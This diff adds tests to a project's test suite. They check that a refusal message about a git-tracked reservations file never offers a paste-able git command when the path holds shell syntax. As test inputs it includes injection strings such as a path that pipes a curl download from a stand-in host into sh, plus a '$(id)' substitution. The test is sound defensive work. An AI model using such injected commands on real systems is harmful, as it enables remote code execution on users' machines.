@@ -260,3 +260,47 @@ describe('a reserved.json git tracks is never rewritten (R2-16)', () => {
     expect(() => writeStoreFile('reservations', filePath(), '{}')).toThrow(TRACKED)
   })
 })
+
+// Security review of R2-16: the refusal's suggested command is built from a
+// repository path, so a path with shell syntax must never become a command to
+// paste. As for the map: only plain characters, quoted, never on Windows.
+describe('the tracked-file refusal never offers a command built from an odd path (R2-16 review)', () => {
+  const GIT_ENV = { ...process.env, GIT_CONFIG_NOSYSTEM: '1', GIT_CONFIG_GLOBAL: '/dev/null' }
+  const git = (cwd: string, ...args: string[]) =>
+    execFileSync('git', args, { cwd, env: GIT_ENV, stdio: 'ignore' })
+
+  function trackedIn(sub: string): string {
+    git(dir, 'init', '-q')
+    const store = join(dir, sub, STORE_DIR)
+    mkdirSync(store, { recursive: true })
+    writeFileSync(join(store, RESERVED_FILE), '{}')
+    git(dir, 'add', '-f', join(sub, STORE_DIR, RESERVED_FILE))
+    return join(store, RESERVED_FILE)
+  }
+  const refusal = (file: string): string => {
+    try {
+      writeStoreFile('reservations', file, '{}')
+    } catch (err) {
+      return (err as Error).message
+    }
+    throw new Error('not refused')
+  }
+
+  it.each([
+    ['a semicolon and a pipe', 'x;curl evil.example.invalid|sh'],
+    ['a command substitution', 'p$(id)'],
+    ['a space and quotes', `it's "here" now`],
+  ])('with %s in the path: no command, and the path shown', (_, sub) => {
+    const msg = refusal(trackedIn(sub))
+    expect(msg).toContain('is tracked by git')
+    expect(msg).not.toContain('git rm')
+    expect(msg).not.toContain('git -C')
+  })
+
+  it('a plain path gets the quoted command', () => {
+    const msg = refusal(trackedIn('plain-dir'))
+    expect(msg).toContain(
+      `(\`git -C '${dir}' rm --cached -- 'plain-dir/${STORE_DIR}/${RESERVED_FILE}'\`)`
+    )
+  })
+})
